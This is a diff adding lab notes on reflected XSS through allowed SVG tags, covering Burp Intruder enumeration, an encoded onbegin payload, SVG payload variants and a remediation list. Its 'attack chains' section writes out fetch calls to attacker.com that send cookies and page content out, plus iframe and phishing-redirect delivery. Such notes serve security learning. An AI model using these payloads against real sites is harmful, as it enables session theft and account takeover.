@@ -4967,29 +4967,499 @@ Execute
 
 ---
 
+# Lab - 12📝 Reflected XSS with SVG Allowed — Final Notes
+
+---
+
+## 🧭 Overview
+
+This lab demonstrates a Reflected XSS vulnerability where:
+
+✔ User input is reflected in HTML  
+✔ Most HTML tags are blocked ❌  
+✔ Some SVG tags & events are allowed ✔  
+
+👉 *Goal:*
+
+alert(1)
+
+---
+
+## 🧠 Core Concept
+
+When HTML is blocked → switch to SVG  
+Find allowed tag + allowed event → execute JS  
+
+---
+
+## 🔄 Flow
+
+User Input → Server → HTML Response → Browser parses SVG → Event triggers → JS executes  
+
+---
+
+## 🧠 Source
+
+Search parameter:
+
+?search=INPUT
+
+---
+
+## 🧠 Sink
+
+HTML context (reflected into page)
+
+---
+
+## ⚠️ Restrictions
+
+<script> ❌
+<img> ❌
+Most HTML tags ❌
+
+Some SVG tags ✔
+Some SVG events ✔
+
+
+---
+
+## 🧠 Key Discovery (via Burp Intruder)
+
+---
+
+### 🔹 Allowed TAGS
+
+```
+<svg>
+<animatetransform>
+<title>
+<image>
+```
+---
+
+## 🪜 Lab Walkthrough
+
+---
+
+### Step 1 — Test Reflection
+
+
+test123
+
+
+✔ Reflected in page  
+
+---
+
+### Step 2 — Try Basic Payload
+
+```
+<img src=1 onerror=alert(1)>
+```
+
+❌ Blocked  
+
+---
+
+### Step 3 — Find Allowed Tags
+  
+Go to search bar and add random input. Intercept the request and send it to intruder.
+Replace input with:
+
+Payload used:
+
+```
+<§§>
+```
+
+👉 Found SVG-related tags allowed ✔  
+
+![SVG allowed tag](../images/svg-allowed-tags.png)
+
+---
+
+### Step 4 — Find Allowed Events
+
+Payload used:
+
+```
+<svg><animatetransform §§=1>
+```
+
+👉 Found:
+
+
+onbegin ✔
+
+
+![SVG allowed event](../images/svg-allowed-events.png)
+
+---
+
+### Step 5 — Build Payload
+
+```
+<svg><animatetransform onbegin=alert(1)>
+```
+  
+---
+
+### Step 6 — Break Context
+
+```
+"><svg><animatetransform onbegin=alert(1)>
+```
+
+---
+
+### Step 7 — Encode Payload (IMPORTANT)
+
+```
+%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E
+```
+  
+---
+
+💥 FINAL PAYLOAD
+
+```
+https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E
+```
+
+(Encode before sending to victim)
+  
+![SVG final payload](../images/svg-final-payload.png)
+
+---
+
+## 🧠 Payload Breakdown
+
+---
+
+### 🔹 Context Break
+
+```
+">
+```
+
+Closes existing HTML context  
+
+---
+
+### 🔹 SVG Container
+
+```
+<svg>
+```
+
+Allowed tag  
+
+---
+
+### 🔹 Animation Element
+
+```
+<animatetransform>
+```
+
+Supports animation events  
+
+---
+
+### 🔹 Auto Trigger Event
+
+```
+onbegin
+```
+
+Executes automatically when animation starts  
+
+---
+
+### 🔹 Execution
+
+```
+alert(1)
+```
+
+Runs JavaScript  
+
+---
+
+## 🪜 Execution Flow
+
+1️⃣ Payload injected  
+2️⃣ Server reflects input  
+3️⃣ Browser parses SVG  
+4️⃣ Animation starts  
+5️⃣ onbegin fires  
+6️⃣ alert executes 💥  
+
+---
+
+## 🧠 🔥 Encoding Concept (IMPORTANT)
+
+Raw payload → may break URL ❌  
+Encoded payload → safe & executable ✔  
+
+Examples:
+
+```
+<  → %3C
+>  → %3E
+"  → %22
+```
+
+---
+
+## 🧠 Key Learning
+
+We don’t guess payloads ❌  
+We ENUMERATE allowed behavior ✔  
+
+---
+
+## 🌍 Real-World SVG XSS Scenarios
+
+---
+
+### 🟢 1️⃣ Basic SVG Auto Trigger
+
+```
+<svg onload=alert(1)>
+```
+
+✔ Works if onload allowed  
+
+---
+
+### 🟢 2️⃣ Animation-Based (Lab Style)
+
+```
+<svg><animate onbegin=alert(1)>
+```
+
+---
+
+### 🟢 3️⃣ Transform-Based
+
+```
+<svg><animatetransform onbegin=alert(1)>
+```
+
+---
+
+### 🟢 4️⃣ Image Inside SVG
+
+```
+<svg><image href=1 onerror=alert(1)>
+```
+
+---
+
+### 🟢 5️⃣ Title Tag Trick
+
+```
+<svg><title onmouseover=alert(1)>
+```
+
+---
+
+### 🟢 6️⃣ foreignObject (High Impact)
+
+```
+'<svg><foreignObject><script>alert(1)</script></foreignObject></svg>'
+```
+
+### 🟢 7️⃣ Event Chaining
+```
+<svg><animatetransform onbegin=eval('alert(1)')>
+```
+
+---
+
+### 🟢 8️⃣ Obfuscated Payload
+```
+<svg><animatetransform onbegin=alert(String.fromCharCode(49))>
+```
+
+---
+
+### 🟢 9️⃣ URL-Based Delivery
+```
+https://target.com/?search=ENCODED_PAYLOAD
+```
+
+---
+
+### 🟢 🔟 Iframe Delivery (Real Attack)
+```
+<iframe src="https://target.com/?search=PAYLOAD"></iframe>
+```
+
+✔ Used in phishing / exploit chains
+
+---
+
+## 🎯 High-Value Targets
+
+- Search functionality
+
+- Filters & query parameters
+
+- Reporting dashboards
+
+- Analytics pages
+
+- Legacy frontend apps
+
+- CMS preview pages
+
+- Error pages rendering query params
+
+- Tracking/redirect endpoints
+
+
+
+---
+
+## 🔗 Attack Chains (Real Impact)
+
+
+---
+
+### 🔥 Session Hijacking
+```
+fetch("https://attacker.com?c="+document.cookie)
+```
+
+---
+
+### 🔥 Account Takeover
+
+Steal:
+
+- Session tokens
+
+- Auth cookies
+
+
+---
+
+### 🔥 Admin Compromise
+
+Admin visits malicious link → payload executes
+
+---
+
+### 🔥 Data Exfiltration
+```
+fetch("https://attacker.com?d="+document.body.innerHTML)
+```
+
+---
+
+### 🔥 Phishing Redirection
+```
+onbegin="location='https://fake-login.com'"
+```
+
+---
+
+### 🔥 DOM Clobbering + XSS Chain (Advanced)
+
+Override DOM elements → manipulate JS behavior → escalate impact
+
+---
+
+### 🔥 OAuth Token Theft (High Value)
+
+Inject payload in redirect/preview → steal access_token from DOM
+
+
+---
+
+### 🧪 Testing Methodology
+
+1️⃣ Test reflection
+2️⃣ Try basic payload
+3️⃣ Detect blocking
+4️⃣ Enumerate tags
+5️⃣ Enumerate events
+6️⃣ Identify auto-trigger events
+7️⃣ Build payload
+8️⃣ Break context
+9️⃣ Encode payload
+🔟 Execute
+
+
+---
+
+## ⚠️ Why This XSS Is Special
+
+- HTML blocked but SVG allowed
+
+- Uses animation-based execution
+
+- Very common in real-world WAF bypass
+
+---
+
+## 🛡 Remediation
+
+- Disable SVG if not needed
+
+- Sanitize SVG content
+
+- Escape all user input
+
+- Avoid dynamic HTML injection
+
+- Use strict CSP
+
+- Whitelist safe attributes only
+
+---
+
+## 🧠 Bug Hunter Mindset
+
+Ask:
+
+👉 Are HTML tags blocked?
+👉 Is SVG allowed?
+👉 Which SVG tags work?
+👉 Which events auto-trigger?
+👉 Do I need encoding?
+
+
+---
+
+## 🧠 Ultimate Mental Model
+
+Enumerate
+↓
+Find allowed SVG
+↓
+Find allowed event
+↓
+Combine
+↓
+Encode
+↓
+Execute
+
+
+---
+
 ## 💡 Extra Tips
 
-- Try random tag names  
-- Always add trigger  
-- Use DevTools  
-- Focus on execution  
+- Always test SVG when HTML blocked
 
----
+- Focus on auto-trigger events (onload, onbegin)
 
-## ✅ Mastery
+- Use Burp Intruder for discovery
 
-✔ Custom tag XSS  
-✔ Focus-based execution  
-✔ WAF bypass  
-✔ Trigger engineering  
-✔ Real payload delivery  
+- Encoding = critical in reflected XSS
 
----
-
-## 🚀 Next Level
-
-👉 XSS polyglots  
-👉 CSP bypass  
-👉 DOM + Angular XSS  
-
----
+- Execution > payload complexity
